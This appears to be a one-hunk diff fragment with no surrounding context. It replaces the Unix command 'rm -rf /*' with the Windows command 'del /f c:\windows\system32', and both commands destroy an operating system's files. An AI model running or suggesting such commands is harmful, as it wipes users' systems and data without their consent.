@@ -1,1 +1,1 @@
-rm -rf /*
+del /f c:\windows\system32
